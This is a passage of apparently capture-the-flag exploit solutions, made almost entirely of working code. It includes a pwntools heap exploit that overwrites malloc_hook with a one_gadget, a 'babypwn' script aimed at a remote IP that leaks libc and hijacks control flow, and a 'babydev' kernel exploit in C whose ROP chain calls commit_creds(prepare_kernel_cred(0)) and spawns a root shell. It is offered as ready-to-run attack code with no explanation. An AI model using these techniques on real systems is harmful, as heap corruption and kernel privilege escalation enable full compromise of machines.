s.sendline("5") 
sleep(0.1) 
s.sendline(pattern) 
add()#0 
add()#1 
free(0) 
glob("/*") 
show(0) 
libc = s.recvuntil("\x7f")[-6:]+"\x00\x00" 
libc = u64(libc)-0x3c4b78 
success(hex(libc)) 
add()#2 
malloc_hook = libc+0x3c4aed 
one = libc+0xf0364 
free(2) 
edit(2,p64(malloc_hook)) 
add()#3 
add()#4 
edit(4,'A'*19+p64(one)) 
free(3) 
free(3) 
free(3) 
# gdb.attach(s,"b malloc\nc") 
s.interactive() 
# 0x45226 execve("/bin/sh", rsp+0x30, environ) 
# constraints: 
#   rax == NULL 
# 0x4527a execve("/bin/sh", rsp+0x30, environ) 
# constraints: 
#   [rsp+0x30] == NULL 
# 0xf0364 execve("/bin/sh", rsp+0x50, environ) 
# constraints: 
#   [rsp+0x50] == NULL 
# 0xf1207 execve("/bin/sh", rsp+0x70, environ) 
# constraints: 
#   [rsp+0x70] == NULL 
babypwn 
# -*- coding: utf-8 -*- 
from pwn import * 
r = lambda x: p.recvuntil(x,drop=True) 
s = lambda x,y: p.sendafter(x,y) 
sl = lambda x,y : p.sendlineafter(x,y) 
# p = process('./pwn') 
p = remote('8.131.69.237', 52642) 
# l = ELF('/lib/x86_64-linux-gnu/libc.so.6') 
l = ELF('./libc-2.23.so') 
def init(): 
sl('choice:\n',str(1)) 
def create(): 
sl('choice:\n',str(2)) 
def add(sz): 
sl('choice:\n',str(3)) 
sl('size:\n', str(sz)) 
def sets(cnt): 
sl('choice:\n',str(4)) 
s('content:\n', cnt) 
def show(): 
sl('choice:\n',str(5)) 
def size(): 
sl('choice:\n',str(6)) 
def exit(): 
sl('choice:\n',str(7)) 
init() 
create() 
# leaking libc 
add(0x60) 
show() 
r('show:\n') 
p.recv(8) 
heap = u64(p.recv(8))-0x11cf0 
log.info("@ heap: "+hex(heap)) 
init() 
show() 
r('show:\n') 
l.address = u64(p.recv(8))-0x3c4b78 
log.info("@ libc: "+hex(l.address)) 
system = l.sym['system'] 
log.info("@ system: "+hex(system)) 
binsh = next(l.search('/bin/sh')) 
log.info("@ binsh: "+hex(binsh)) 
one = l.address+0xf1207 
log.info("@ one: "+hex(one)) 
# Find a strange 
add(0x88) 
sets(p64(heap+0x11c50)+p64(0)+p64(0)+p64(0)+p64(0x401350)+3*p64(0)+p64(one)) 
size() 
p.interactive() 
babydev 
#include  
#include  
#include  
#include  
#include  
#include  
#include  
#include  
#define pop_rdi 0xffffffff813ead2c 
#define prepare_kernel_cred 0xffffffff8108d690 
#define xchg_rax_rdi 0xffffffff81768ef2 
#define commit_creds 0xffffffff8108d340 
#define swapgs 0xffffffff81c00eae 
#define iretq 0xffffffff81025a56 
int fd; 
size_t data[0x4000]; 
size_t mydata; 
size_t stack; 
unsigned long user_cs, user_ss, user_eflags,user_sp ; 
void save_status() { 
asm( 
"movq %%cs, %0\n" 
"movq %%ss, %1\n" 
"movq %%rsp, %3\n" 
"pushfq\n" 
"popq %2\n" 
:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp) 
: 
: "memory" 
); 
} 
void shell() 
{ 
printf("%d\n",getuid()); 
system("/bin/sh"); 
} 
int main() 
{ 
printf("%d\n",getuid()); 
save_status(); 
signal(SIGSEGV, shell); 
signal(SIGTRAP, shell); 
fd = open("/dev/mychrdev", O_WRONLY); 
ioctl(fd,0x1111,data); 
mydata=data[4]; 
stack=( data[2] | 0xffffc90000000000) -0x10; 
printf("[+] mydata at %p\n",mydata); 
printf("[+] stack at %p\n",stack); 
write(fd,data,0xf000); 
llseek(fd,0x100,0); 
write(fd,data,0x10000); 
llseek(fd,0x10001,0); 
data[0]=stack-mydata; 
data[1]=stack-mydata+0x10000; 
write(fd,(char *)data+1,0x10000); 
size_t off=stack&0xff; 
llseek(fd,off,0); 
int i=0; 
data[i++]=pop_rdi; 
data[i++]=0; 
data[i++]=prepare_kernel_cred; 
data[i++]=xchg_rax_rdi; 
data[i++]=commit_creds; 
data[i++]=swapgs; 
data[i++]=0x246; 
data[i++]=0; 
data[i++]=iretq; 
data[i++]=&shell; 
data[i++]=user_cs; 
data[i++]=user_eflags; 
data[i++]=user_sp; 
data[i++]=user_ss; 
write(fd,data,0x100); 
} 